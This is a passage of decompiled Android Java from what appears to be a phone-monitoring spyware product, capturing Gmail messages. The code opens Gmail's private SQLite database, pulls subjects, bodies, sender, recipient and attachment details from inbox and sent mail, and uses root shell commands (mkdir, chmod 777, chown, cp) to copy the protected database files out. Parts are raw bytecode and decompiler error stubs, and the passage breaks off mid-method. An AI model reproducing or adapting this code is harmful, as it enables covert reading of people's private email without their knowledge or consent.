package com.vvt.capture.email.gmail;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.vvt.capture.email.a.d;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.Reader;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.HashSet;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static long a(String paramString1, String paramString2)
  {
    boolean bool1 = false;
    localCursor = null;
    int i = 2;
    int j = 1;
    long l = 0L;
    localSQLiteDatabase = c.a(c.a(paramString1, paramString2));
    if (localSQLiteDatabase != null)
    {
      boolean bool2 = localSQLiteDatabase.isDbLockedByCurrentThread();
      if (!bool2)
      {
        bool2 = localSQLiteDatabase.isDbLockedByOtherThreads();
        if (!bool2) {
          break label73;
        }
      }
    }
    bool1 = b;
    if ((!bool1) || (localSQLiteDatabase != null)) {
      localSQLiteDatabase.close();
    }
    for (;;)
    {
      return l;
      label73:
      Object[] arrayOfObject1 = new Object[18];
      arrayOfObject1[0] = "messages";
      arrayOfObject1[j] = "_id";
      arrayOfObject1[i] = "message_labels";
      arrayOfObject1[3] = "_id";
      arrayOfObject1[4] = "messages";
      arrayOfObject1[5] = "message_labels";
      arrayOfObject1[6] = "messageId";
      arrayOfObject1[7] = "message_messageId";
      arrayOfObject1[8] = "labels";
      arrayOfObject1[9] = "labels_id";
      arrayOfObject1[10] = "labels";
      arrayOfObject1[11] = "_id";
      arrayOfObject1[12] = "name";
      arrayOfObject1[13] = "^i";
      arrayOfObject1[14] = "name";
      arrayOfObject1[15] = "^f";
      arrayOfObject1[16] = "clientCreated";
      int m = 17;
      arrayOfObject1[m] = "m_label_id";
      String str1 = String.format("SELECT %s.%s AS mid, %s.%s AS m_label_id,* FROM %s LEFT JOIN %s ON %s = %s LEFT JOIN %s ON %s = %s.%s WHERE (%s = '%s' OR %s = '%s') AND %s = 0 ORDER BY %s DESC", arrayOfObject1);
      Object[] arrayOfObject2 = new Object[i];
      String str2 = "m_label_id";
      arrayOfObject2[0] = str2;
      arrayOfObject2[j] = str1;
      str1 = String.format("SELECT MAX(%s) AS refId FROM (%s) ", arrayOfObject2);
      arrayOfObject1 = null;
      try
      {
        localCursor = localSQLiteDatabase.rawQuery(str1, null);
        if (localCursor != null)
        {
          int k = localCursor.getCount();
          if (k != 0) {}
        }
        else
        {
          bool3 = b;
          if ((!bool3) || (localCursor != null)) {
            localCursor.close();
          }
          localSQLiteDatabase.close();
          if (localCursor != null) {
            localCursor.close();
          }
          if (localSQLiteDatabase == null) {
            continue;
          }
          localSQLiteDatabase.close();
          continue;
        }
        bool3 = localCursor.moveToNext();
        if (bool3)
        {
          bool3 = false;
          str1 = null;
          l = localCursor.getLong(0);
        }
        if (localCursor != null) {
          localCursor.close();
        }
        if (localSQLiteDatabase == null) {
          break label373;
        }
      }
      catch (Exception localException)
      {
        for (;;)
        {
          boolean bool3 = c;
          if ((!bool3) || (localCursor != null)) {
            localCursor.close();
          }
          if (localSQLiteDatabase == null) {}
        }
      }
      finally
      {
        if (localCursor == null) {
          break label426;
        }
        localCursor.close();
        if (localSQLiteDatabase == null) {
          break label436;
        }
        localSQLiteDatabase.close();
      }
      localSQLiteDatabase.close();
      label373:
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private static com.vvt.capture.email.c a(SQLiteDatabase paramSQLiteDatabase, String paramString1, Cursor paramCursor, d paramd, String paramString2, String paramString3)
  {
    int i = 0;
    Object localObject1 = null;
    if (paramCursor != null)
    {
      boolean bool1 = paramCursor.isClosed();
      if (!bool1)
      {
        int j = paramCursor.getPosition();
        int m = -1;
        if (j != m) {
          break label54;
        }
      }
    }
    boolean bool2 = c;
    if (bool2) {}
    return (com.vvt.capture.email.c)localObject1;
    label54:
    i = paramCursor.getColumnIndex("name");
    Object localObject2 = paramCursor.getString(i);
    i = 0;
    localObject1 = null;
    Object localObject3 = "^i";
    bool2 = ((String)localObject2).equals(localObject3);
    if (bool2) {
      i = 1;
    }
    label354:
    label431:
    label721:
    label736:
    int i1;
    for (int n = i;; i1 = 0)
    {
      i = paramCursor.getColumnIndex("messageId");
      long l1 = paramCursor.getLong(i);
      i = paramCursor.getColumnIndex("subject");
      String str1 = paramCursor.getString(i);
      i = paramCursor.getColumnIndex("body");
      localObject1 = paramCursor.getString(i);
      int k;
      int i2;
      if (localObject1 == null)
      {
        localObject2 = "bodyCompressed";
        k = paramCursor.getColumnIndex((String)localObject2);
        i2 = -1;
        if (k != i2)
        {
          localObject2 = paramCursor.getBlob(k);
          if (localObject2 != null) {
            localObject1 = a((byte[])localObject2);
          }
        }
      }
      for (Object localObject4 = localObject1;; localObject4 = localObject1)
      {
        i = paramCursor.getColumnIndex("fromAddress");
        localObject1 = paramCursor.getString(i);
        k = paramCursor.getColumnIndex("toAddresses");
        String str2 = paramCursor.getString(k);
        k = paramCursor.getColumnIndex("ccAddresses");
        String str3 = paramCursor.getString(k);
        k = paramCursor.getColumnIndex("bccAddresses");
        Object localObject5 = paramCursor.getString(k);
        k = paramCursor.getColumnIndex("joinedAttachmentInfos");
        localObject2 = paramCursor.getString(k);
        Object localObject6 = b((String)localObject1);
        localObject1 = c((String)localObject1);
        int i3;
        int i5;
        String[] arrayOfString;
        List localList;
        if (localObject6 != null)
        {
          i3 = localObject6.length;
          int i4 = 1;
          if (i3 >= i4) {}
        }
        else
        {
          i5 = 1;
          localObject6 = new String[i5];
          i3 = 0;
          arrayOfString = null;
          localObject6[0] = paramString1;
          localObject6 = paramd.a((String[])localObject6);
          if (localObject6 != null)
          {
            i5 = ((String)localObject6).length();
            i3 = 1;
            if (i5 >= i3) {}
          }
          else
          {
            if (localObject1 != null)
            {
              i5 = localObject1.length;
              i3 = 1;
              if (i5 >= i3) {
                break label721;
              }
            }
            localObject1 = "";
          }
          localObject6 = b(str2);
          arrayOfString = b(str3);
          localObject5 = b((String)localObject5);
          localObject1 = paramSQLiteDatabase;
          str2 = paramString2;
          str3 = paramString3;
          localList = a(paramSQLiteDatabase, (String)localObject2, l1, paramString2, paramString3);
          localObject1 = new java/util/ArrayList;
          ((ArrayList)localObject1).<init>();
          localObject2 = Arrays.asList((Object[])localObject6);
          ((ArrayList)localObject1).addAll((Collection)localObject2);
          localObject2 = Arrays.asList(arrayOfString);
          ((ArrayList)localObject1).addAll((Collection)localObject2);
          localObject2 = Arrays.asList((Object[])localObject5);
          ((ArrayList)localObject1).addAll((Collection)localObject2);
          k = ((ArrayList)localObject1).size();
          localObject2 = new String[k];
          localObject1 = (String[])((ArrayList)localObject1).toArray((Object[])localObject2);
          localObject1 = paramd.a((String[])localObject1);
          if (localObject1 != null)
          {
            i = ((String)localObject1).length();
            if (i != 0) {}
          }
          else
          {
            localObject1 = "";
          }
          i2 = -1;
          if (n == 0) {
            break label736;
          }
          localObject1 = "dateReceivedMs";
          i = paramCursor.getColumnIndex((String)localObject1);
        }
        for (long l2 = paramCursor.getLong(i);; l2 = paramCursor.getLong(i))
        {
          localObject3 = new com/vvt/capture/email/c;
          ((com.vvt.capture.email.c)localObject3).<init>();
          ((com.vvt.capture.email.c)localObject3).a(l2);
          ((com.vvt.capture.email.c)localObject3).a(n);
          ((com.vvt.capture.email.c)localObject3).a(i2);
          ((com.vvt.capture.email.c)localObject3).a(paramString1);
          ((com.vvt.capture.email.c)localObject3).a((String[])localObject6);
          ((com.vvt.capture.email.c)localObject3).b(arrayOfString);
          ((com.vvt.capture.email.c)localObject3).c((String[])localObject5);
          ((com.vvt.capture.email.c)localObject3).b(str1);
          ((com.vvt.capture.email.c)localObject3).a(localList);
          ((com.vvt.capture.email.c)localObject3).c((String)localObject4);
          localObject1 = localObject3;
          break;
          i3 = 0;
          arrayOfString = null;
          paramString1 = localObject6[0];
          break label354;
          i5 = 0;
          localObject6 = null;
          localObject1 = localObject1[0];
          break label431;
          localObject1 = "dateSentMs";
          i = paramCursor.getColumnIndex((String)localObject1);
        }
      }
    }
  }
  
  public static String a()
  {
    String[] arrayOfString = b();
    int i = arrayOfString.length;
    int j = 0;
    String str = null;
    int k = 0;
    if (k < i)
    {
      str = arrayOfString[k];
      HashSet localHashSet = a(str);
      int m = localHashSet.size();
      if (m <= 0) {}
    }
    for (;;)
    {
      return str;
      j = k + 1;
      k = j;
      break;
      j = 0;
      str = null;
    }
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, long paramLong, String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 4
    //   3: aconst_null
    //   4: astore 5
    //   6: bipush 6
    //   8: istore 6
    //   10: iconst_0
    //   11: istore 7
    //   13: ldc -15
    //   15: astore 8
    //   17: bipush 7
    //   19: istore 9
    //   21: iload 9
    //   23: anewarray 4	java/lang/Object
    //   26: astore 10
    //   28: ldc -13
    //   30: astore 11
    //   32: aload 10
    //   34: iconst_0
    //   35: aload 11
    //   37: aastore
    //   38: aload 10
    //   40: iconst_1
    //   41: ldc -11
    //   43: aastore
    //   44: aload 10
    //   46: iconst_2
    //   47: ldc -9
    //   49: aastore
    //   50: aload 10
    //   52: iconst_3
    //   53: ldc -7
    //   55: aastore
    //   56: lload_1
    //   57: invokestatic 255	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   60: astore 12
    //   62: aload 10
    //   64: iconst_4
    //   65: aload 12
    //   67: aastore
    //   68: iconst_5
    //   69: istore 13
    //   71: aload 10
    //   73: iload 13
    //   75: ldc_w 257
    //   78: aastore
    //   79: aload 10
    //   81: iload 6
    //   83: aload_3
    //   84: aastore
    //   85: aload 8
    //   87: aload 10
    //   89: invokestatic 92	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   92: astore 12
    //   94: getstatic 13	com/vvt/capture/email/gmail/removeFromPath:a	Z
    //   97: istore 14
    //   99: iload 14
    //   101: ifeq +3 -> 104
    //   104: getstatic 13	com/vvt/capture/email/gmail/removeFromPath:a	Z
    //   107: istore 14
    //   109: iload 14
    //   111: ifeq +3 -> 114
    //   114: iconst_0
    //   115: istore 13
    //   117: aconst_null
    //   118: astore 11
    //   120: iconst_0
    //   121: istore 4
    //   123: aconst_null
    //   124: astore 5
    //   126: iload 13
    //   128: iload 6
    //   130: if_icmpgt +188 -> 318
    //   133: iconst_0
    //   134: istore 4
    //   136: aconst_null
    //   137: astore 5
    //   139: aload_0
    //   140: aload 12
    //   142: aconst_null
    //   143: invokevirtual 98	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   146: astore 10
    //   148: aload 10
    //   150: ifnull +278 -> 428
    //   153: iconst_0
    //   154: istore 14
    //   156: aconst_null
    //   157: astore 8
    //   159: iconst_0
    //   160: istore 4
    //   162: aconst_null
    //   163: astore 5
    //   165: aload 10
    //   167: invokeinterface 108 1 0
    //   172: istore 15
    //   174: iload 15
    //   176: ifeq +106 -> 282
    //   179: ldc -11
    //   181: astore 16
    //   183: aload 10
    //   185: aload 16
    //   187: invokeinterface 124 2 0
    //   192: istore 15
    //   194: aload 10
    //   196: iload 15
    //   198: invokeinterface 128 2 0
    //   203: astore 16
    //   205: ldc_w 259
    //   208: astore 17
    //   210: aload 16
    //   212: aload 17
    //   214: invokevirtual 263	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   217: istore 15
    //   219: iload 15
    //   221: ifeq +32 -> 253
    //   224: ldc -13
    //   226: astore 5
    //   228: aload 10
    //   230: aload 5
    //   232: invokeinterface 124 2 0
    //   237: istore 4
    //   239: aload 10
    //   241: iload 4
    //   243: invokeinterface 128 2 0
    //   248: astore 5
    //   250: goto -85 -> 165
    //   253: ldc -13
    //   255: astore 8
    //   257: aload 10
    //   259: aload 8
    //   261: invokeinterface 124 2 0
    //   266: istore 14
    //   268: aload 10
    //   270: iload 14
    //   272: invokeinterface 128 2 0
    //   277: astore 8
    //   279: goto -114 -> 165
    //   282: aload 5
    //   284: ifnull +150 -> 434
    //   287: ldc_w 265
    //   290: astore 16
    //   292: aload 5
    //   294: aload 16
    //   296: invokevirtual 268	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   299: istore 15
    //   301: iload 15
    //   303: ifeq +131 -> 434
    //   306: aload 10
    //   308: ifnull +10 -> 318
    //   311: aload 10
    //   313: invokeinterface 105 1 0
    //   318: getstatic 13	com/vvt/capture/email/gmail/removeFromPath:a	Z
    //   321: istore 7
    //   323: iload 7
    //   325: ifeq +3 -> 328
    //   328: aload 5
    //   330: areturn
    //   331: astore 5
    //   333: iconst_0
    //   334: istore 4
    //   336: aconst_null
    //   337: astore 5
    //   339: iconst_0
    //   340: istore 14
    //   342: aconst_null
    //   343: astore 8
    //   345: getstatic 21	com/vvt/capture/email/gmail/removeFromPath:MyUncaughtExceptionHandler	Z
    //   348: istore 9
    //   350: iload 9
    //   352: ifeq +3 -> 355
    //   355: aload 8
    //   357: ifnull +10 -> 367
    //   360: aload 8
    //   362: invokeinterface 105 1 0
    //   367: aload 5
    //   369: astore 8
    //   371: iload 13
    //   373: iload 6
    //   375: if_icmpeq +13 -> 388
    //   378: ldc2_w 269
    //   381: lstore 18
    //   383: lload 18
    //   385: invokestatic 277	android/os/SystemClock:sleep	(J)V
    //   388: iload 13
    //   390: iconst_1
    //   391: iadd
    //   392: istore 4
    //   394: iload 4
    //   396: istore 13
    //   398: aload 8
    //   400: astore 5
    //   402: goto -276 -> 126
    //   405: astore 5
    //   407: iconst_0
    //   408: istore 9
    //   410: aconst_null
    //   411: astore 10
    //   413: aload 10
    //   415: ifnull +10 -> 425
    //   418: aload 10
    //   420: invokeinterface 105 1 0
    //   425: aload 5
    //   427: athrow
    //   428: iconst_0
    //   429: istore 14
    //   431: aconst_null
    //   432: astore 8
    //   434: aload 10
    //   436: ifnull -65 -> 371
    //   439: aload 10
    //   441: invokeinterface 105 1 0
    //   446: goto -75 -> 371
    //   449: astore 5
    //   451: goto -38 -> 413
    //   454: astore 5
    //   456: aload 8
    //   458: astore 10
    //   460: goto -47 -> 413
    //   463: astore 5
    //   465: iconst_0
    //   466: istore 4
    //   468: aconst_null
    //   469: astore 5
    //   471: aload 10
    //   473: astore 8
    //   475: goto -130 -> 345
    //   478: astore 5
    //   480: aload 8
    //   482: astore 5
    //   484: aload 10
    //   486: astore 8
    //   488: goto -143 -> 345
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	491	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	491	1	paramLong	long
    //   0	491	3	paramString	String
    //   1	466	4	i	int
    //   4	325	5	str1	String
    //   331	1	5	localException1	Exception
    //   337	64	5	localObject1	Object
    //   405	21	5	localObject2	Object
    //   449	1	5	localObject3	Object
    //   454	1	5	localObject4	Object
    //   463	1	5	localException2	Exception
    //   469	1	5	localObject5	Object
    //   478	1	5	localException3	Exception
    //   482	1	5	localObject6	Object
    //   8	368	6	j	int
    //   11	313	7	bool1	boolean
    //   15	472	8	localObject7	Object
    //   19	3	9	k	int
    //   348	61	9	bool2	boolean
    //   26	459	10	localObject8	Object
    //   30	89	11	str2	String
    //   60	81	12	localObject9	Object
    //   69	328	13	m	int
    //   97	58	14	bool3	boolean
    //   266	164	14	n	int
    //   172	3	15	bool4	boolean
    //   192	5	15	i1	int
    //   217	85	15	bool5	boolean
    //   181	114	16	str3	String
    //   208	5	17	str4	String
    //   381	3	18	l	long
    // Exception table:
    //   from	to	target	type
    //   142	146	331	java/lang/Exception
    //   142	146	405	finally
    //   165	172	449	finally
    //   185	192	449	finally
    //   196	203	449	finally
    //   212	217	449	finally
    //   230	237	449	finally
    //   241	248	449	finally
    //   259	266	449	finally
    //   270	277	449	finally
    //   294	299	449	finally
    //   345	348	454	finally
    //   165	172	463	java/lang/Exception
    //   185	192	463	java/lang/Exception
    //   196	203	463	java/lang/Exception
    //   212	217	463	java/lang/Exception
    //   230	237	463	java/lang/Exception
    //   241	248	463	java/lang/Exception
    //   259	266	463	java/lang/Exception
    //   270	277	463	java/lang/Exception
    //   294	299	478	java/lang/Exception
  }
  
  private static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str1 = "file://";
    int i = paramString2.indexOf(str1);
    int j = -1;
    if (i != j)
    {
      int k = str1.length() + i;
      paramString2 = paramString2.substring(k);
    }
    bool1 = ShellUtil.b(paramString2);
    Object localObject2 = d(paramString1);
    str1 = p.a((String)localObject2, paramString3);
    String str2;
    int m;
    if (bool1)
    {
      str2 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
      m = 5;
    }
    for (;;)
    {
      try
      {
        Object[] arrayOfObject = new Object[m];
        int n = 0;
        String str3 = null;
        arrayOfObject[0] = localObject2;
        n = 1;
        arrayOfObject[n] = localObject2;
        n = 2;
        arrayOfObject[n] = paramString4;
        n = 3;
        arrayOfObject[n] = paramString4;
        n = 4;
        arrayOfObject[n] = localObject2;
        str2 = String.format(str2, arrayOfObject);
        KMShell.a(str2);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k((String)localObject2);
        }
        str2 = "%s cp -f -- '%s' %s; chmod 777 %s; chown %s.%s %s";
        j = 7;
        localObject2 = new Object[j];
        m = 0;
        arrayOfObject = null;
        str3 = e(paramString1);
        localObject2[0] = str3;
        m = 1;
        localObject2[m] = paramString2;
        m = 2;
        localObject2[m] = str1;
        m = 3;
        localObject2[m] = str1;
        m = 4;
        localObject2[m] = paramString4;
        m = 5;
        localObject2[m] = paramString4;
        m = 6;
        localObject2[m] = str1;
        str2 = String.format(str2, (Object[])localObject2);
        KMShell.a(str2);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k(str1);
        }
        bool1 = a;
        if (!bool1) {}
      }
      catch (Exception localException)
      {
        boolean bool2 = false;
        Object localObject1 = null;
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      return str1;
      bool2 = a;
      if (bool2) {}
      bool2 = false;
      str1 = null;
    }
  }
  
  /* Error */
  public static String a(byte[] paramArrayOfByte)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: new 315	java/lang/StringBuffer
    //   7: astore_3
    //   8: aload_3
    //   9: invokespecial 316	java/lang/StringBuffer:<init>	()V
    //   12: new 318	java/io/ByteArrayInputStream
    //   15: astore 4
    //   17: aload 4
    //   19: aload_0
    //   20: invokespecial 321	java/io/ByteArrayInputStream:<init>	([B)V
    //   23: new 323	java/util/zip/InflaterInputStream
    //   26: astore 5
    //   28: aload 5
    //   30: aload 4
    //   32: invokespecial 326	java/util/zip/InflaterInputStream:<init>	(Ljava/io/InputStream;)V
    //   35: new 328	java/io/InputStreamReader
    //   38: astore 6
    //   40: ldc_w 330
    //   43: astore 7
    //   45: aload 6
    //   47: aload 5
    //   49: aload 7
    //   51: invokespecial 333	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;Ljava/lang/String;)V
    //   54: new 335	java/io/BufferedReader
    //   57: astore 7
    //   59: aload 7
    //   61: aload 6
    //   63: invokespecial 338	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   66: aload 7
    //   68: invokevirtual 342	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   71: astore_2
    //   72: aload_2
    //   73: ifnull +159 -> 232
    //   76: aload_3
    //   77: aload_2
    //   78: invokevirtual 346	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   81: pop
    //   82: goto -16 -> 66
    //   85: astore_2
    //   86: aload 7
    //   88: astore_2
    //   89: aload 4
    //   91: astore 7
    //   93: aload 5
    //   95: astore 4
    //   97: getstatic 21	com/vvt/capture/email/gmail/removeFromPath:MyUncaughtExceptionHandler	Z
    //   100: istore 8
    //   102: iload 8
    //   104: ifeq +3 -> 107
    //   107: aload 4
    //   109: ifnull +8 -> 117
    //   112: aload 4
    //   114: invokevirtual 347	java/util/zip/InflaterInputStream:close	()V
    //   117: aload 7
    //   119: ifnull +8 -> 127
    //   122: aload 7
    //   124: invokevirtual 348	java/io/ByteArrayInputStream:close	()V
    //   127: aload 6
    //   129: ifnull +8 -> 137
    //   132: aload 6
    //   134: invokevirtual 349	java/io/InputStreamReader:close	()V
    //   137: aload_2
    //   138: ifnull +7 -> 145
    //   141: aload_2
    //   142: invokevirtual 350	java/io/BufferedReader:close	()V
    //   145: aload_3
    //   146: invokevirtual 353	java/lang/StringBuffer:toString	()Ljava/lang/String;
    //   149: areturn
    //   150: astore 6
    //   152: aconst_null
    //   153: astore 7
    //   155: aconst_null
    //   156: astore 4
    //   158: iconst_0
    //   159: istore 8
    //   161: aconst_null
    //   162: astore 5
    //   164: aload 5
    //   166: ifnull +8 -> 174
    //   169: aload 5
    //   171: invokevirtual 347	java/util/zip/InflaterInputStream:close	()V
    //   174: aload 4
    //   176: ifnull +8 -> 184
    //   179: aload 4
    //   181: invokevirtual 348	java/io/ByteArrayInputStream:close	()V
    //   184: aload_2
    //   185: ifnull +7 -> 192
    //   188: aload_2
    //   189: invokevirtual 349	java/io/InputStreamReader:close	()V
    //   192: aload 7
    //   194: ifnull +8 -> 202
    //   197: aload 7
    //   199: invokevirtual 350	java/io/BufferedReader:close	()V
    //   202: aload 6
    //   204: athrow
    //   205: astore_2
    //   206: getstatic 21	com/vvt/capture/email/gmail/removeFromPath:MyUncaughtExceptionHandler	Z
    //   209: istore_1
    //   210: iload_1
    //   211: ifeq -9 -> 202
    //   214: goto -12 -> 202
    //   217: astore 6
    //   219: getstatic 21	com/vvt/capture/email/gmail/removeFromPath:MyUncaughtExceptionHandler	Z
    //   222: istore 9
    //   224: iload 9
    //   226: ifeq -81 -> 145
    //   229: goto -84 -> 145
    //   232: aload 5
    //   234: ifnull +8 -> 242
    //   237: aload 5
    //   239: invokevirtual 347	java/util/zip/InflaterInputStream:close	()V
    //   242: aload 4
    //   244: ifnull +8 -> 252
    //   247: aload 4
    //   249: invokevirtual 348	java/io/ByteArrayInputStream:close	()V
    //   252: aload 6
    //   254: ifnull +8 -> 262
    //   257: aload 6
    //   259: invokevirtual 349	java/io/InputStreamReader:close	()V
    //   262: aload 7
    //   264: ifnull -119 -> 145
    //   267: aload 7
    //   269: invokevirtual 350	java/io/BufferedReader:close	()V
    //   272: goto -127 -> 145
    //   275: astore 6
    //   277: getstatic 21	com/vvt/capture/email/gmail/removeFromPath:MyUncaughtExceptionHandler	Z
    //   280: istore 9
    //   282: iload 9
    //   284: ifeq -139 -> 145
    //   287: goto -142 -> 145
    //   290: astore 6
    //   292: aconst_null
    //   293: astore 7
    //   295: iconst_0
    //   296: istore 8
    //   298: aconst_null
    //   299: astore 5
    //   301: goto -137 -> 164
    //   304: astore 6
    //   306: aconst_null
    //   307: astore 7
    //   309: goto -145 -> 164
    //   312: astore 10
    //   314: aconst_null
    //   315: astore 7
    //   317: aload 6
    //   319: astore_2
    //   320: aload 10
    //   322: astore 6
    //   324: goto -160 -> 164
    //   327: astore 10
    //   329: aload 6
    //   331: astore_2
    //   332: aload 10
    //   334: astore 6
    //   336: goto -172 -> 164
    //   339: astore 10
    //   341: aload 4
    //   343: astore 5
    //   345: aload 7
    //   347: astore 4
    //   349: aload_2
    //   350: astore 7
    //   352: aload 6
    //   354: astore_2
    //   355: aload 10
    //   357: astore 6
    //   359: goto -195 -> 164
    //   362: astore 6
    //   364: iconst_0
    //   365: istore 9
    //   367: aconst_null
    //   368: astore 6
    //   370: aconst_null
    //   371: astore 7
    //   373: aconst_null
    //   374: astore 4
    //   376: goto -279 -> 97
    //   379: astore 6
    //   381: iconst_0
    //   382: istore 9
    //   384: aconst_null
    //   385: astore 6
    //   387: aload 4
    //   389: astore 7
    //   391: aconst_null
    //   392: astore 4
    //   394: goto -297 -> 97
    //   397: astore 6
    //   399: iconst_0
    //   400: istore 9
    //   402: aconst_null
    //   403: astore 6
    //   405: aload 4
    //   407: astore 7
    //   409: aload 5
    //   411: astore 4
    //   413: goto -316 -> 97
    //   416: astore 7
    //   418: aload 4
    //   420: astore 7
    //   422: aload 5
    //   424: astore 4
    //   426: goto -329 -> 97
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	429	0	paramArrayOfByte	byte[]
    //   1	210	1	bool1	boolean
    //   3	75	2	str	String
    //   85	1	2	localIOException1	IOException
    //   88	101	2	localObject1	Object
    //   205	1	2	localIOException2	IOException
    //   319	36	2	localObject2	Object
    //   7	139	3	localStringBuffer	StringBuffer
    //   15	410	4	localObject3	Object
    //   26	397	5	localObject4	Object
    //   38	95	6	localInputStreamReader	java.io.InputStreamReader
    //   150	53	6	localObject5	Object
    //   217	41	6	localIOException3	IOException
    //   275	1	6	localIOException4	IOException
    //   290	1	6	localObject6	Object
    //   304	14	6	localObject7	Object
    //   322	36	6	localObject8	Object
    //   362	1	6	localIOException5	IOException
    //   368	1	6	localObject9	Object
    //   379	1	6	localIOException6	IOException
    //   385	1	6	localObject10	Object
    //   397	1	6	localIOException7	IOException
    //   403	1	6	localObject11	Object
    //   43	365	7	localObject12	Object
    //   416	1	7	localIOException8	IOException
    //   420	1	7	localObject13	Object
    //   100	197	8	bool2	boolean
    //   222	179	9	bool3	boolean
    //   312	9	10	localObject14	Object
    //   327	6	10	localObject15	Object
    //   339	17	10	localObject16	Object
    // Exception table:
    //   from	to	target	type
    //   66	71	85	java/io/IOException
    //   77	82	85	java/io/IOException
    //   12	15	150	finally
    //   19	23	150	finally
    //   169	174	205	java/io/IOException
    //   179	184	205	java/io/IOException
    //   188	192	205	java/io/IOException
    //   197	202	205	java/io/IOException
    //   112	117	217	java/io/IOException
    //   122	127	217	java/io/IOException
    //   132	137	217	java/io/IOException
    //   141	145	217	java/io/IOException
    //   237	242	275	java/io/IOException
    //   247	252	275	java/io/IOException
    //   257	262	275	java/io/IOException
    //   267	272	275	java/io/IOException
    //   23	26	290	finally
    //   30	35	290	finally
    //   35	38	304	finally
    //   49	54	304	finally
    //   54	57	312	finally
    //   61	66	312	finally
    //   66	71	327	finally
    //   77	82	327	finally
    //   97	100	339	finally
    //   12	15	362	java/io/IOException
    //   19	23	362	java/io/IOException
    //   23	26	379	java/io/IOException
    //   30	35	379	java/io/IOException
    //   35	38	397	java/io/IOException
    //   49	54	397	java/io/IOException
    //   54	57	416	java/io/IOException
    //   61	66	416	java/io/IOException
  }
  
  public static ArrayList a(String paramString1, String paramString2, long paramLong, d paramd, String paramString3, String paramString4)
  {
    Cursor localCursor = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = c.a(c.a(paramString1, paramString2));
    if (localObject1 == null)
    {
      boolean bool1 = b;
      if (bool1) {}
      localObject1 = localArrayList;
      return (ArrayList)localObject1;
    }
    Object localObject2 = new Object[18];
    localObject2[0] = "messages";
    localObject2[1] = "_id";
    localObject2[2] = "message_labels";
    localObject2[3] = "_id";
    localObject2[4] = "messages";
    localObject2[5] = "message_labels";
    localObject2[6] = "messageId";
    localObject2[7] = "message_messageId";
    localObject2[8] = "labels";
    localObject2[9] = "labels_id";
    localObject2[10] = "labels";
    localObject2[11] = "_id";
    localObject2[12] = "name";
    localObject2[13] = "^i";
    localObject2[14] = "name";
    localObject2[15] = "^f";
    Object localObject3 = Long.valueOf(paramLong);
    localObject2[16] = localObject3;
    int i = 17;
    localObject3 = "clientCreated";
    localObject2[i] = localObject3;
    Object localObject4 = String.format("SELECT %s.%s AS mid, %s.%s AS m_label_id,* FROM %s LEFT JOIN %s ON %s = %s LEFT JOIN %s ON %s = %s.%s WHERE (%s = '%s' OR %s = '%s') AND m_label_id > %d AND %s = 0 ", (Object[])localObject2);
    localObject2 = null;
    for (;;)
    {
      try
      {
        localCursor = ((SQLiteDatabase)localObject1).rawQuery((String)localObject4, null);
        if (localCursor != null)
        {
          bool2 = localCursor.moveToNext();
          if (bool2)
          {
            localObject4 = paramString2;
            localObject2 = paramd;
            localObject3 = paramString4;
            localObject4 = a((SQLiteDatabase)localObject1, paramString2, localCursor, paramd, paramString3, paramString4);
            localArrayList.add(localObject4);
            continue;
          }
        }
      }
      catch (Exception localException)
      {
        boolean bool2 = c;
        if ((!bool2) || (localCursor != null)) {
          localCursor.close();
        }
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
        localObject1 = localArrayList;
        break;
      }
      finally
      {
        if (localCursor != null) {
          localCursor.close();
        }
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
      }
      if (localCursor != null) {
        localCursor.close();
      }
      if (localObject1 == null) {}
    }
  }
  
  public static ArrayList a(String paramString1, String paramString2, d paramd, int paramInt, String paramString3, String paramString4)
  {
    Cursor localCursor = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = c.a(c.a(paramString1, paramString2));
    if (localObject1 == null)
    {
      boolean bool1 = b;
      if (bool1) {}
      localObject1 = localArrayList;
      return (ArrayList)localObject1;
    }
    Object localObject2 = new Object[19];
    localObject2[0] = "messages";
    localObject2[1] = "_id";
    localObject2[2] = "message_labels";
    localObject2[3] = "_id";
    localObject2[4] = "messages";
    localObject2[5] = "message_labels";
    localObject2[6] = "messageId";
    localObject2[7] = "message_messageId";
    localObject2[8] = "labels";
    localObject2[9] = "labels_id";
    localObject2[10] = "labels";
    localObject2[11] = "_id";
    localObject2[12] = "name";
    localObject2[13] = "^i";
    localObject2[14] = "name";
    localObject2[15] = "^f";
    localObject2[16] = "clientCreated";
    localObject2[17] = "m_label_id";
    int i = 18;
